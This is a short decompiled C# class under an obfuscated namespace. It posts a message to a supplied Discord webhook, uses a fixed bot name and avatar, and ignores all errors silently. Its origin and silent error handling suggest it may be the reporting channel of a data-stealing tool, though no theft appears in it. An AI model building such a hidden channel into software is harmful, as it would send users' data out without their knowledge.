using System;
using System.Collections.Generic;
using System.Net.Http;

namespace Y7ZKmzt9pCd7;

internal class Webhook
{
	private string webhook;

	public Webhook(string userWebhook)
	{
		webhook = userWebhook;
	}

	public void Send(string content)
	{
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		Dictionary<string, string> dictionary = new Dictionary<string, string>
		{
			{ "content", content },
			{ "username", "Y7ZKmzt9pCd7" },
			{ "avatar_url", "https://i.ibb.co/0frTD92/discord-avatar-512.png" }
		};
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				val.PostAsync(webhook, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary)).GetAwaiter().GetResult();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}
}
